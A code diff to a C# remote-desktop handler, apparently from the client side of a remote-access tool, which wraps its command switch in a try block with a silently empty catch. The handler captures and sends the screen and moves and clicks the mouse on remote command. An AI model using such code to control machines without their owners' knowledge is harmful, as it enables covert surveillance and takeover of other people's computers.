@@ -18,29 +18,33 @@ namespace Client.Handle_Packet
 
         public HandleRemoteDesktop(MsgPack unpack_msgpack)
         {
-            switch (unpack_msgpack.ForcePathObject("Option").AsString)
+            try
             {
-                case "capture":
-                    {
-                        CaptureAndSend(Convert.ToInt32(unpack_msgpack.ForcePathObject("Quality").AsInteger), Convert.ToInt32(unpack_msgpack.ForcePathObject("Screen").AsInteger));
-                        break;
-                    }
+                switch (unpack_msgpack.ForcePathObject("Option").AsString)
+                {
+                    case "capture":
+                        {
+                            CaptureAndSend(Convert.ToInt32(unpack_msgpack.ForcePathObject("Quality").AsInteger), Convert.ToInt32(unpack_msgpack.ForcePathObject("Screen").AsInteger));
+                            break;
+                        }
 
-                case "mouseClick":
-                    {
-                        Point position = new Point((Int32)unpack_msgpack.ForcePathObject("X").AsInteger, (Int32)unpack_msgpack.ForcePathObject("Y").AsInteger);
-                        Cursor.Position = position;
-                        mouse_event((Int32)unpack_msgpack.ForcePathObject("Button").AsInteger, 0, 0, 0, 1);
-                        break;
-                    }
+                    case "mouseClick":
+                        {
+                            Point position = new Point((Int32)unpack_msgpack.ForcePathObject("X").AsInteger, (Int32)unpack_msgpack.ForcePathObject("Y").AsInteger);
+                            Cursor.Position = position;
+                            mouse_event((Int32)unpack_msgpack.ForcePathObject("Button").AsInteger, 0, 0, 0, 1);
+                            break;
+                        }
 
-                case "mouseMove":
-                    {
-                        Point position = new Point((Int32)unpack_msgpack.ForcePathObject("X").AsInteger, (Int32)unpack_msgpack.ForcePathObject("Y").AsInteger);
-                        Cursor.Position = position;
-                        break;
-                    }
+                    case "mouseMove":
+                        {
+                            Point position = new Point((Int32)unpack_msgpack.ForcePathObject("X").AsInteger, (Int32)unpack_msgpack.ForcePathObject("Y").AsInteger);
+                            Cursor.Position = position;
+                            break;
+                        }
+                }
             }
+            catch { }
         }
         public void CaptureAndSend(int quality, int Scrn)
         {
